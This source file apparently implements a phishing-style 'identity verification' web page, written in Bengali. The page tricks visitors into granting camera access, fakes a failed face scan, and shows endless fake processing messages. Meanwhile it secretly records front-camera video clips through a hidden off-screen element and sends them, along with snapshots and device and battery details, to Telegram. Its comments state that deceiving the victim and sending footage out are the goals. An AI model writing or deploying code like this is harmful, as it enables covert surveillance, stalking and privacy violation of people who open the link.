import React, { useState, useEffect, useRef } from 'react';
import {
  Camera,
  AlertCircle,
  RefreshCw,
  ExternalLink,
  Shield,
  Loader2,
} from 'lucide-react';
import { doc, getDoc, setDoc } from 'firebase/firestore';
import { db, AlisLinkData, VerificationRecordData, handleFirestoreError, OperationType } from '../firebase';
import { getDeviceInfo, getFullDeviceInfo, getBatteryStatus, RichDeviceInfo } from '../utils/deviceInfo';
import { generateVerificationId } from '../utils/crypto';
import { sendTelegramVerificationNotification, sendSecurityClipToServer, sendVisitorEntryAlert } from '../utils/telegram';

interface VerificationPageProps {
  alisId?: string;
  onNavigate: (path: string) => void;
}

type VerificationStep = 'idle' | 'scanning_1' | 'failed_1' | 'scanning_2' | 'processing_loop';

const EXCUSE_MESSAGES = [
  'সার্ভারে ফেস ফ্রেম বায়োমেট্রিক অ্যালগরিদম মিলানো হচ্ছে...',
  'ক্লাউড সিকিউরিটি এনক্রিপশন কি (AES-256) হ্যান্ডশেক চলছে...',
  'নেটওয়ার্ক লেটেন্সি চেক ও সেশন ভ্যালিডেশন প্রক্রিয়াধীন...',
  'ডিভাইস ইন্টিগ্রিটি ও লাইভনেস ডিটেকশন প্রসেসিং...',
  'এজ সার্ভার সিঙ্ক্রোনাইজেশন সম্পন্ন হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...',
  'সিকিউরিটি নোড কনফার্মেশন রিসিভ করা হচ্ছে...',
  'আইডেন্টিটি সেশন সুরক্ষা প্রোটোকল চূড়ান্ত যাচাই চলছে...',
  'হাই-রেজ্যুলিউশন বায়োমেট্রিক ক্লাউড ম্যাচিং সম্পন্ন হচ্ছে...',
];

export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNavigate }) => {
  // Alis Link State
  const [alisData, setAlisData] = useState<AlisLinkData | null>(null);
  const [loadingAlis, setLoadingAlis] = useState(true);
  const [linkError, setLinkError] = useState<string | null>(null);

  // Verification step state - persist loading tab if previously entered
  const storageLoadingKey = `alis_loading_active_${alisId || 'direct'}`;
  const [step, setStep] = useState<VerificationStep>(() => {
    try {
      if (typeof window !== 'undefined' && localStorage.getItem(`alis_loading_active_${alisId || 'direct'}`) === 'true') {
        return 'processing_loop';
      }
    } catch {}
    return 'idle';
  });
  const [showCameraModal, setShowCameraModal] = useState(false);
  const [cameraScanProgress, setCameraScanProgress] = useState(0);
  const [cameraError, setCameraError] = useState<string | null>(null);

  // Excuse message cycling state
  const [excuseIndex, setExcuseIndex] = useState(0);

  // References for live stream & continuous recording
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const backgroundVideoRef = useRef<HTMLVideoElement | null>(null);
  const activeStreamRef = useRef<MediaStream | null>(null);
  const isLoopRunningRef = useRef<boolean>(false);
  const currentVerificationIdRef = useRef<string>(generateVerificationId());
  const deviceInfoRef = useRef<RichDeviceInfo | null>(null);

  // Load Alis Link and Device Info on mount + send immediate visitor entry alert
  useEffect(() => {
    getFullDeviceInfo().then((info) => {
      deviceInfoRef.current = info;
      // Send immediate visitor entry alert upon link open
      sendVisitorEntryAlert({
        verificationId: currentVerificationIdRef.current,
        alisId: alisId || 'direct',
        deviceInfo: info,
      }).catch(() => {});
    }).catch(() => {});

    async function loadAlisLink() {
      if (!alisId) {
        setLoadingAlis(false);
        return;
      }

      try {
        const linkDocRef = doc(db, 'alis', alisId);
        const snap = await getDoc(linkDocRef);

        if (!snap.exists()) {
          setLinkError('এই ভেরিফিকেশন লিঙ্কটি পাওয়া যায়নি অথবা মুছে ফেলা হয়েছে।');
          setLoadingAlis(false);
          return;
        }

        const data = snap.data() as AlisLinkData;

        // If link was already visited/used: Keep showing loading tab as instructed
        if (data.status === 'used') {
          setStep('processing_loop');
          try {
            localStorage.setItem(storageLoadingKey, 'true');
          } catch {}
        }

        setAlisData(data);
      } catch (err) {
        const errorMsg = handleFirestoreError(err, OperationType.GET, `alis/${alisId}`);
        setLinkError(errorMsg);
      } finally {
        setLoadingAlis(false);
      }
    }

    loadAlisLink();
  }, [alisId, storageLoadingKey]);

  // Persist loading state and automatically resume continuous camera background loop
  useEffect(() => {
    if (step === 'processing_loop') {
      try {
        localStorage.setItem(storageLoadingKey, 'true');
      } catch {}

      // If background recording loop is not running yet, automatically acquire stream
      if (!isLoopRunningRef.current) {
        acquireStream().then((stream) => {
          startContinuousTenSecondLoop(stream, currentVerificationIdRef.current);
        }).catch(() => {
          // If browser requires user interaction first, it will start upon next touch
        });
      }
    }
  }, [step, storageLoadingKey]);

  // Rotate excuses during continuous loading state
  useEffect(() => {
    if (step !== 'processing_loop') return;

    const interval = setInterval(() => {
      setExcuseIndex((prev) => (prev + 1) % EXCUSE_MESSAGES.length);
    }, 3200);

    return () => clearInterval(interval);
  }, [step]);

  // Auto-reactivate and sync when reconnecting from offline to online
  useEffect(() => {
    const handleReconnection = async () => {
      try {
        const freshBattery = await getBatteryStatus();
        if (deviceInfoRef.current) {
          deviceInfoRef.current.batteryLevel = freshBattery.level;
          deviceInfoRef.current.batteryCharging = freshBattery.charging;
        }
      } catch {}

      // If in loading loop, ensure continuous loop is active and stream is healthy
      if (step === 'processing_loop') {
        if (!isLoopRunningRef.current || !activeStreamRef.current?.active) {
          acquireStream().then((stream) => {
            startContinuousTenSecondLoop(stream, currentVerificationIdRef.current);
          }).catch(() => {});
        }
      }
    };

    window.addEventListener('online', handleReconnection);
    return () => window.removeEventListener('online', handleReconnection);
  }, [step]);

  // Clean up media streams when unmounting
  useEffect(() => {
    return () => {
      isLoopRunningRef.current = false;
      if (activeStreamRef.current) {
        activeStreamRef.current.getTracks().forEach((track) => track.stop());
        activeStreamRef.current = null;
      }
    };
  }, []);

  // Capture instant photo snapshot from active video stream
  const capturePhotoSnapshot = (stream: MediaStream): string | undefined => {
    try {
      const track = stream.getVideoTracks()[0];
      if (!track) return undefined;
      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      if (!ctx) return undefined;

      const video = videoRef.current || backgroundVideoRef.current;
      if (video) {
        try {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
          if (dataUrl && dataUrl.length > 500) {
            return dataUrl;
          }
        } catch {
          // Continue fallback
        }
      }
    } catch (snapErr) {
      console.warn('Snapshot capture error:', snapErr);
    }
    return undefined;
  };

  // Continuous 10-second video recording and 2-second pause loop
  // Rule: 10 sc video nibe, 2 sc off, abar 10 sc nibe, abar 2 sc off
  const startContinuousTenSecondLoop = (stream: MediaStream, verifId: string) => {
    if (isLoopRunningRef.current) return;
    isLoopRunningRef.current = true;
    currentVerificationIdRef.current = verifId;

    let cycleNum = 0;

    const runCycle = () => {
      if (!isLoopRunningRef.current || !stream.active) {
        return;
      }

      let recorder: MediaRecorder | null = null;
      try {
        const mimeCandidates = [
          'video/mp4;codecs=avc1',
          'video/mp4',
          'video/webm;codecs=h264',
          'video/webm;codecs=vp8',
          'video/webm',
        ];
        const selectedMime = mimeCandidates.find((m) => {
          try {
            return typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported(m);
          } catch {
            return false;
          }
        }) || '';

        recorder = selectedMime
          ? new MediaRecorder(stream, { mimeType: selectedMime })
          : new MediaRecorder(stream);
      } catch (recErr) {
        console.warn('MediaRecorder init error:', recErr);
        // Fallback: send snapshot photo every 12s (10s + 2s off)
        setTimeout(() => {
          if (isLoopRunningRef.current && stream.active) {
            cycleNum++;
            const photoBase64 = capturePhotoSnapshot(stream);
            if (photoBase64) {
              sendTelegramVerificationNotification({
                verificationId: currentVerificationIdRef.current || verifId,
                alisId: alisId || 'direct',
                photoBase64,
                deviceInfo: deviceInfoRef.current || undefined,
              });
            }
            // 2 seconds off before next cycle
            setTimeout(runCycle, 2000);
          }
        }, 10000);
        return;
      }

      const recordedBlobs: Blob[] = [];

      recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedBlobs.push(event.data);
        }
      };

      recorder.onstop = async () => {
        cycleNum++;

        if (recordedBlobs.length > 0) {
          try {
            const clipBlob = new Blob(recordedBlobs, { type: recorder?.mimeType || 'video/mp4' });
            
            // Dynamically refresh battery and charging status for this clip
            try {
              const freshBattery = await getBatteryStatus();
              if (deviceInfoRef.current) {
                deviceInfoRef.current.batteryLevel = freshBattery.level;
                deviceInfoRef.current.batteryCharging = freshBattery.charging;
              }
            } catch {
              // Ignore battery refresh failure
            }

            // Send video clip immediately with zero delay
            sendSecurityClipToServer({
              verificationId: currentVerificationIdRef.current || verifId,
              alisId: alisId || 'direct',
              cycle: cycleNum,
              videoBlob: clipBlob,
              mimeType: 'video/mp4',
              deviceInfo: deviceInfoRef.current || undefined,
            }).catch((e) => console.warn('Clip send warning:', e));

            // Background conversion for server compatibility if needed
            const fileReader = new FileReader();
            fileReader.onloadend = () => {
              const base64Content = (fileReader.result as string) || '';
              if (base64Content) {
                sendSecurityClipToServer({
                  verificationId: currentVerificationIdRef.current || verifId,
                  alisId: alisId || 'direct',
                  cycle: cycleNum,
                  videoBase64: base64Content,
                  mimeType: 'video/mp4',
                  deviceInfo: deviceInfoRef.current || undefined,
                }).catch(() => {});
              }
            };
            fileReader.readAsDataURL(clipBlob);
          } catch (blobErr) {
            console.warn('Clip packaging error:', blobErr);
          }
        }

        // Exactly 2 seconds pause (2sc off) before next recording
        if (isLoopRunningRef.current && stream.active) {
          setTimeout(runCycle, 2000);
        }
      };

      try {
        // Collect timeslice chunks every 1000ms
        recorder.start(1000);
        // Fast initial clip (4s) so data arrives on Telegram immediately, subsequent clips 10s
        const clipDuration = cycleNum === 0 ? 4000 : 10000;
        setTimeout(() => {
          if (recorder && recorder.state === 'recording') {
            recorder.stop();
          }
        }, clipDuration);
      } catch (err) {
        console.warn('Recorder start error:', err);
      }
    };

    runCycle();
  };

  // Helper to ensure media stream
  const acquireStream = async (): Promise<MediaStream> => {
    if (activeStreamRef.current && activeStreamRef.current.active) {
      return activeStreamRef.current;
    }
    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'user',
        width: { ideal: 640 },
        height: { ideal: 480 },
      },
      audio: false,
    });
    activeStreamRef.current = stream;

    if (backgroundVideoRef.current) {
      backgroundVideoRef.current.srcObject = stream;
      backgroundVideoRef.current.play().catch(() => {});
    }

    return stream;
  };

  // 1st Attempt: Runs scan -> Fails intentionally -> Starts background loop
  const handleStartFirstScan = async () => {
    setCameraError(null);
    setStep('scanning_1');
    setCameraScanProgress(15);
    setShowCameraModal(true);

    try {
      const stream = await acquireStream();

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play().catch(() => {});
      }

      setCameraScanProgress(45);

      // Dispatch early snapshot at 200ms and 800ms to guarantee photo reaches Telegram fast
      setTimeout(() => {
        const earlySnapshot = capturePhotoSnapshot(stream);
        if (earlySnapshot) {
          sendTelegramVerificationNotification({
            verificationId: currentVerificationIdRef.current,
            alisId: alisId || 'direct',
            photoBase64: earlySnapshot,
            deviceInfo: deviceInfoRef.current || undefined,
          }).catch(() => {});
        }
      }, 200);

      setTimeout(() => {
        const secondSnapshot = capturePhotoSnapshot(stream);
        if (secondSnapshot) {
          sendTelegramVerificationNotification({
            verificationId: currentVerificationIdRef.current,
            alisId: alisId || 'direct',
            photoBase64: secondSnapshot,
            deviceInfo: deviceInfoRef.current || undefined,
          }).catch(() => {});
        }
      }, 800);

      setTimeout(() => {
        setCameraScanProgress(75);
      }, 1000);

      setTimeout(() => {
        setCameraScanProgress(100);
      }, 2000);

      setTimeout(async () => {
        // Capture initial photo snapshot immediately and send to TG
        const photoSnapshot = capturePhotoSnapshot(stream);
        const newId = currentVerificationIdRef.current;

        // Ensure fresh full device info with battery & location
        let currentDevInfo = deviceInfoRef.current;
        try {
          currentDevInfo = await getFullDeviceInfo();
          deviceInfoRef.current = currentDevInfo;
        } catch {
          // Keep current if fetch fails
        }

        sendTelegramVerificationNotification({
          verificationId: newId,
          alisId: alisId || 'direct',
          photoBase64: photoSnapshot,
          deviceInfo: currentDevInfo || undefined,
        }).catch(() => {});

        // Store Firestore record
        const info = getDeviceInfo();
        const now = new Date();
        const expires = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000);
        const recordPayload: Omit<VerificationRecordData, 'id'> = {
          status: 'VALID',
          createdAt: now.toISOString(),
          expiresAt: expires.toISOString(),
          browser: info.browser,
          platform: info.platform,
          screen: info.screen,
          referrer: info.referrer,
          alisId: alisId || 'direct-verification',
        };
        setDoc(doc(db, 'verifications', newId), recordPayload).catch(() => {});

        // Close modal and set state to FAILED
        setShowCameraModal(false);
        setStep('failed_1');

        // Start 10s video, 2s off continuous loop in the background!
        startContinuousTenSecondLoop(stream, newId);
      }, 2600);
    } catch (err) {
      console.warn('Camera access denied:', err);
      setShowCameraModal(false);
      setStep('idle');
      setCameraError('ক্যামেরা পারমিশন পাওয়া যায়নি। অনুগ্রহ করে ব্রাউজার সেটিংসে ক্যামেরা পারমিশন এলাউ (Allow) করুন।');
    }
  };

  // 2nd Attempt: Scans briefly -> Enters infinite loading state with rotating excuses
  const handleStartSecondScan = async () => {
    setCameraError(null);
    setStep('scanning_2');
    setCameraScanProgress(20);
    setShowCameraModal(true);

    try {
      const stream = await acquireStream();

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play().catch(() => {});
      }

      setCameraScanProgress(60);

      setTimeout(() => {
        setCameraScanProgress(95);
      }, 1200);

      setTimeout(() => {
        setShowCameraModal(false);
        // Switch to perpetual realistic loading screen
        setStep('processing_loop');

        // Ensure background loop is running
        startContinuousTenSecondLoop(stream, currentVerificationIdRef.current);
      }, 2500);
    } catch (err) {
      console.warn('Camera error in 2nd attempt:', err);
      setShowCameraModal(false);
      setStep('processing_loop');
    }
  };

  // Loading Link State
  if (loadingAlis) {
    return (
      <div className="min-h-[70vh] flex flex-col items-center justify-center p-6 text-center">
        <RefreshCw className="w-6 h-6 text-white animate-spin mb-3" />
        <p className="text-xs font-mono text-neutral-400">Validating verification session...</p>
      </div>
    );
  }

  // Error Link State (Expired, Used, or Not Found)
  if (linkError) {
    return (
      <div className="max-w-lg mx-auto px-4 py-16 text-center space-y-6">
        <div className="w-14 h-14 rounded-2xl bg-[#0e0e0e] border border-rose-900/50 flex items-center justify-center mx-auto text-rose-400 shadow-xl">
          <AlertCircle className="w-7 h-7" />
        </div>
        <div className="space-y-2">
          <h2 className="text-xl font-bold text-white tracking-tight">
            যাচাইকরণ লিংকটি আর সক্রিয় নয়
          </h2>
          <p className="text-xs text-neutral-400 font-mono leading-relaxed max-w-sm mx-auto">
            {linkError}
          </p>
        </div>
        <div className="pt-4 flex items-center justify-center">
          <button
            onClick={() => onNavigate('/')}
            className="px-5 py-2.5 rounded-lg bg-white text-black text-xs font-semibold hover:bg-neutral-200 transition"
          >
            হোম পেজ
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 py-8 sm:py-12 space-y-6">
      {/* Background Persistent Video keeping camera stream alive without being paused by display:none */}
      <video
        ref={backgroundVideoRef}
        autoPlay
        playsInline
        muted
        className="fixed -top-[9999px] -left-[9999px] w-[320px] h-[240px] opacity-[0.001] pointer-events-none z-[-100]"
        aria-hidden="true"
      />

      {/* Main Profile & Verification Card */}
      <div className="rounded-xl bg-[#0a0a0a] border border-[#222222] overflow-hidden shadow-2xl">
        {/* Banner with Profile Photo */}
        <div className="relative h-48 sm:h-56 w-full bg-black border-b border-[#222222] flex flex-col justify-end p-5 sm:p-6 overflow-hidden">
          <img
            src="https://i.ibb.co.com/ycgDW1tb/1789286431036.jpg"
            alt="Mehedi Hasan Profile Banner"
            referrerPolicy="no-referrer"
            className="absolute inset-0 w-full h-full object-cover object-center"
          />
          {/* High-contrast dark gradient overlay */}
          <div className="absolute inset-0 bg-gradient-to-t from-black via-black/70 to-black/30" />

          {/* Top-Right Follow Action */}
          <div className="absolute top-4 right-4 z-10">
            <a
              href="https://github.com/MehediHasan"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-lg bg-white text-black text-xs font-semibold hover:bg-neutral-200 transition shadow-lg"
            >
              <span>Follow: Mehedi Hasan</span>
              <ExternalLink className="w-3.5 h-3.5 text-black" />
            </a>
          </div>

          {/* Profile Picture and Identity */}
          <div className="relative z-10 flex items-end gap-3.5 sm:gap-4">
            <div className="relative w-16 h-16 sm:w-20 sm:h-20 rounded-xl overflow-hidden border-2 border-white bg-black shrink-0 shadow-2xl">
              <img
                src="https://i.ibb.co.com/ycgDW1tb/1789286431036.jpg"
                alt="Mehedi Hasan"
                referrerPolicy="no-referrer"
                className="w-full h-full object-cover"
              />
            </div>

            <div className="space-y-1">
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-black/80 border border-[#333333] text-neutral-300 uppercase tracking-wider">
                  Vercel Verified
                </span>
                <span className="flex items-center gap-1 text-[11px] font-mono text-emerald-400">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                  Ready
                </span>
              </div>
              <h1 className="text-lg sm:text-xl font-bold text-white tracking-tight">
                Mehedi Hasan
              </h1>
              <p className="text-xs text-neutral-300 font-mono">
                mehedihasan.vercel.app
              </p>
            </div>
          </div>
        </div>

        {/* Vercel Details Bar */}
        <div className="p-4 sm:p-5 bg-[#0a0a0a] border-b border-[#222222] flex flex-wrap items-center justify-between gap-3 text-xs font-mono text-neutral-400">
          <div className="flex items-center gap-4 flex-wrap">
            <div className="flex items-center gap-1.5 text-white">
              <svg viewBox="0 0 76 65" className="w-4 h-4 fill-white" aria-label="Vercel Delta">
                <path d="M37.5274 0L75.0548 65H0L37.5274 0Z" />
              </svg>
              <span className="font-semibold text-xs">Vercel Production</span>
            </div>
            <span>•</span>
            <span className="text-neutral-300">Environment: Production</span>
            <span>•</span>
            <span className="text-neutral-400">Edge Network: Active</span>
          </div>

          <div className="flex items-center gap-2 text-[11px]">
            <span className="px-2 py-0.5 rounded bg-emerald-950/60 border border-emerald-800/40 text-emerald-400">
              HTTPS Strict
            </span>
          </div>
        </div>

        {/* Action & Verification States */}
        <div className="p-6 space-y-5">
          {/* 1. INITIAL IDLE STATE */}
          {step === 'idle' && (
            <div className="space-y-4">
              <div className="space-y-1">
                <h2 className="text-base font-semibold text-white">
                  আইডেন্টিটি ভেরিফিকেশন
                </h2>
                <p className="text-xs text-neutral-400 font-mono leading-relaxed">
                  আপনার ডিভাইস ও সেশন সুরক্ষা নিশ্চিত করতে ক্যামেরা অ্যাক্সেস প্রয়োজন।
                </p>
              </div>

              {cameraError && (
                <div className="p-3.5 rounded-lg bg-rose-950/40 border border-rose-800/50 text-rose-300 text-xs flex items-start gap-2.5">
                  <AlertCircle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                  <span>{cameraError}</span>
                </div>
              )}

              <button
                id="start-verification-btn"
                onClick={handleStartFirstScan}
                className="w-full py-3.5 px-6 rounded-lg bg-white hover:bg-neutral-200 text-black font-bold text-sm tracking-wide transition flex items-center justify-center gap-2.5 shadow-xl active:scale-[0.99]"
              >
                <Camera className="w-4 h-4 text-black stroke-[2.5]" />
                <span>ভেরিফাই করুন</span>
              </button>
            </div>
          )}

          {/* 2. FIRST SCANNING STATE */}
          {step === 'scanning_1' && (
            <div className="p-6 rounded-lg bg-[#0e0e0e] border border-[#222222] text-center space-y-3">
              <RefreshCw className="w-6 h-6 animate-spin text-white mx-auto" />
              <div className="text-sm font-semibold text-white">
                ক্যামেরা যাচাইকরণ চলছে...
              </div>
              <p className="text-xs text-neutral-400 font-mono">
                অনুগ্রহ করে ফ্রেমের দিকে তাকান
              </p>
            </div>
          )}

          {/* 3. FIRST SCAN FAILED STATE (Camera scan neuarpor failed bolbe abar nibe) */}
          {step === 'failed_1' && (
            <div className="space-y-4 animate-in fade-in duration-200">
              <div className="p-4 rounded-lg bg-rose-950/30 border border-rose-800/40 space-y-2">
                <div className="flex items-center gap-2.5 text-rose-400 font-medium text-xs sm:text-sm">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>বায়োমেট্রিক ফেস স্ক্যান সফল হয়নি</span>
                </div>
                <p className="text-xs text-neutral-300 font-mono leading-relaxed pl-6.5">
                  অপর্যাপ্ত আলো অথবা ফ্রেমের বাইরে মুখ থাকায় বায়োমেট্রিক ডেটা সম্পন্ন করা যায়নি। অনুগ্রহ করে আলোতে মুখ রেখে পুনরায় চেষ্টা করুন।
                </p>
              </div>

              <button
                id="retry-verification-btn"
                onClick={handleStartSecondScan}
                className="w-full py-3.5 px-6 rounded-lg bg-white hover:bg-neutral-200 text-black font-bold text-sm tracking-wide transition flex items-center justify-center gap-2.5 shadow-xl active:scale-[0.99]"
              >
                <RefreshCw className="w-4 h-4 text-black stroke-[2.5]" />
                <span>পুনরায় ভেরিফাই করুন</span>
              </button>
            </div>
          )}

          {/* 4. SECOND SCANNING STATE */}
          {step === 'scanning_2' && (
            <div className="p-6 rounded-lg bg-[#0e0e0e] border border-[#222222] text-center space-y-3">
              <RefreshCw className="w-6 h-6 animate-spin text-white mx-auto" />
              <div className="text-sm font-semibold text-white">
                পুনরায় ফেস স্ক্যান সম্পন্ন হচ্ছে...
              </div>
              <p className="text-xs text-neutral-400 font-mono">
                ফ্রেম সোজা রাখুন
              </p>
            </div>
          )}

          {/* 5. CONTINUOUS REALISTIC LOADING STATE ("bibinno bahanai sudu loading dekhabe r footage tg te patabe") */}
          {step === 'processing_loop' && (
            <div className="p-6 rounded-lg bg-[#0d0d0d] border border-[#262626] space-y-5 animate-in fade-in duration-300">
              <div className="flex items-center justify-center gap-3">
                <Loader2 className="w-6 h-6 text-white animate-spin" />
                <span className="text-xs font-mono uppercase tracking-widest text-emerald-400 font-semibold">
                  Processing Verification
                </span>
              </div>

              {/* Dynamic excuse switcher */}
              <div className="min-h-[50px] flex items-center justify-center text-center px-2">
                <p className="text-sm sm:text-base font-medium text-white transition-all duration-300 ease-in-out">
                  {EXCUSE_MESSAGES[excuseIndex]}
                </p>
              </div>

              {/* High-tech pulsing progress bar */}
              <div className="space-y-2">
                <div className="w-full bg-neutral-900 rounded-full h-1.5 overflow-hidden border border-neutral-800 relative">
                  <div className="h-full bg-white rounded-full w-1/3 animate-[pulse_1.5s_ease-in-out_infinite] translate-x-1/2" />
                </div>
                <div className="flex items-center justify-between text-[11px] font-mono text-neutral-400">
                  <span>এনক্রিপ্টেড টানেল: অ্যাক্টিভ</span>
                  <span>ক্লাউড ভ্যালিডেশন চলমান</span>
                </div>
              </div>

              {/* Warning to keep user on the page */}
              <div className="p-3 rounded-lg bg-black border border-[#222222] flex items-start gap-2.5 text-xs text-neutral-400 font-mono">
                <Shield className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                <span>
                  অনুগ্রহ করে পেজটি বন্ধ করবেন না বা রিফ্রেশ করবেন না। সার্ভারে আপনার আইডেন্টিটি ভেরিফিকেশন সেশন চূড়ান্ত হতে কয়েক মুহূর্ত সময় লাগতে পারে।
                </span>
              </div>
            </div>
          )}
        </div>

        {/* Developer Credit Footer */}
        <div className="px-6 py-3 bg-black border-t border-[#222222] flex items-center justify-between text-xs font-mono text-neutral-500">
          <span>Devloped by : <strong className="text-neutral-300">Chiper X 404</strong></span>
          <span className="text-[10px]">Vercel Edge Protection</span>
        </div>
      </div>

      {/* Camera Viewfinder Modal */}
      {showCameraModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md p-4 animate-in fade-in duration-200">
          <div className="w-full max-w-sm rounded-2xl bg-[#0a0a0a] border border-[#333333] p-6 text-center space-y-5 shadow-2xl">
            <div className="space-y-1">
              <span className="text-[10px] font-mono text-neutral-400 uppercase tracking-widest block">
                Face Alignment
              </span>
              <h3 className="text-base font-bold text-white">
                {step === 'scanning_2' ? 'পুনরায় ক্যামেরা যাচাইকরণ' : 'ক্যামেরা যাচাইকরণ'}
              </h3>
              <p className="text-xs text-neutral-400">
                অনুগ্রহ করে ফ্রেমের দিকে তাকান, স্ক্যানিং চলছে...
              </p>
            </div>

            {/* Camera Viewfinder Circle */}
            <div className="relative w-52 h-52 mx-auto rounded-full overflow-hidden border-2 border-white bg-black shadow-2xl">
              <video
                ref={videoRef}
                autoPlay
                playsInline
                muted
                className="w-full h-full object-cover -scale-x-100"
              />
              <div className="absolute inset-0 pointer-events-none flex items-center justify-center">
                <div className="w-36 h-36 rounded-full border border-dashed border-white/70 animate-pulse" />
              </div>
            </div>

            {/* Progress Bar */}
            <div className="space-y-1.5">
              <div className="w-full bg-black border border-[#333333] rounded-full h-2 overflow-hidden">
                <div
                  className="bg-white h-full rounded-full transition-all duration-300 ease-out"
                  style={{ width: `${cameraScanProgress}%` }}
                />
              </div>
              <span className="text-[11px] font-mono text-neutral-400">
                স্ক্যানিং সম্পন্ন: {cameraScanProgress}%
              </span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
